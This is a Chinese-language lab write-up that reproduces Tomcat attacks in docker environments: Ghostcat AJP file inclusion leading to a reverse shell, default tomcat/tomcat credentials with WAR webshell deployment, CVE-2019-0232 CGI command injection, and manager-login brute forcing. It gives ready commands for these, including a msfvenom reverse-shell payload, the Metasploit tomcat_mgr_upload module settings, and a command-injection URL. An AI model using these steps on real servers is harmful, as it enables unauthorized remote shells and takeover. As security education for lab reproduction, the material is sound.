生成一个`test.txt`，这里只需要换payload就可以
    ");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("");
    %>
bp抓包把`test.txt`上传到docker容器
nc开启端口监听
即可获得一个交互型shell
    python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.1.8 -p 8009 -f test.txt
这里为了方便，上线到msf上进行操作，首先生成一个`shell.txt`
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 R > shell.txt
抓包将`shell.txt`上传到docker
msf开启监听，注意payload使用`java/jsp_shell_reverse_tcp`
再使用poc反弹即可上线
    python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.1.8 -p 8009 -f shell.txt
# 弱口令&war远程部署
## 漏洞原理
在tomcat8环境下默认进入后台的密码为tomcat/tomcat，未修改造成未授权即可进入后台
## 漏洞复现
进入`tomcat8`的docker环境
访问后台管理地址，使用tomcat/tomcat进入后台
    http://192.168.1.8:8080//manager/html
进入到了后台的页面
看到这里有一个上传war包的地方，这里很多java的中间件都可以用war远程部署来拿shell，tomcat也不例外
首先将ice.jsp打包成test.war
    jar -cvf test.war .
点击上传即可看到上传的test.war已经部署成功
访问一下没有报错404那么应该已经上传成功
使用冰蝎连接即可得到shell
这里也可以用msf里面的`exploit/multi/http/tomcat_mgr_upload`模块
    use exploit/multi/http/tomcat_mgr_upload
    set HttpPassword tomcat
    set HttpUsername tomcat
    set rhost 192.168.1.8
    set rport 8080
    run
运行即可得到一个meterpreter
# CVE-2019-0232
CVE-2019-0232为Apache Tomcat RCE
## 漏洞原理
漏洞相关的代码在 tomcat\java\org\apache\catalina\servlets\CGIServlet.java
中，CGIServlet提供了一个cgi的调用接口，在启用 enableCmdLineArguments 参数时，会根据RFC
3875来从Url参数中生成命令行参数，并把参数传递至Java的 Runtime 执行。 这个漏洞是因为 Runtime.getRuntime().exec
在Windows中和Linux中底层实现不同导致的
Java的 `Runtime.getRuntime().exec` 在CGI调用这种情况下很难有命令注入。而Windows中创建进程使用的是
`CreateProcess` ，会将参数合并成字符串，作为 `lpComandLine` 传入 `CreateProcess` 。程序启动后调用
`GetCommandLine` 获取参数，并调用 `CommandLineToArgvW` 传至 argv。在Windows中，当
`CreateProcess` 中的参数为 bat 文件或是 cmd 文件时，会调用 `cmd.exe` , 故最后会变成 `cmd.exe /c
"arg.bat & dir"`，而Java的调用过程并没有做任何的转义，所以在Windows下会存在漏洞
## 漏洞复现
启动tomcat
访问一下已经启动成功
Tomcat的 CGI_Servlet组件默认是关闭的，在`conf/web.xml`中找到注释的
CGIServlet部分，去掉注释，并配置enableCmdLineArguments和executable
这里注意一下，去掉注释并添加以下代码
    enableCmdLineArguments启用后才会将Url中的参数传递到命令行
    executable指定了执行的二进制文件，默认是perl，需要置为空才会执行文件本身。
            enableCmdLineArguments
            true
            executable
然后在conf/web.xml中启用cgi的 servlet-mapping
修改conf/context.xml的添加 privileged="true"属性，否则会没有权限
添加true
在`C:\Tomcat\webapps\ROOT\WEB-INF`下创建`cgi-bin`目录
在该目录下创建一个hello.bat
然后重启tomcat环境
访问`http://localhost:8080/cgi-bin/hello.bat?&C%3A%5CWindows%5CSystem32%5Ccalc.exe`即可弹出计算器，这里构造系统命令即可
# manager App暴力破解
## 漏洞原理
后台密码用base64编码传输，抓包解密即可得到后台密码，也可以进行爆破
## 漏洞复现
这里访问`http://192.168.1.8:8000/manager/html`进行抓包，在没有输入帐号密码的时候是没有什么数据的
把这个包放过去，会请求输入用户名和密码，再进行抓包
就可以得到`Authorization`这个字段，这个字段有一个`Basic`，就是base64加密的意思
这里直接放到base64解密得到`tomcat:tomcat`的密码
进入后台之后再次抓包可以看到有一个cookie，但是没有了`Authorization`这个字段
我们可以对字段进行爆破，加上`Authorization`即可
去掉自带的编码
攻击即可拿到账号密码
欢迎关注公众号 **红队蓝军**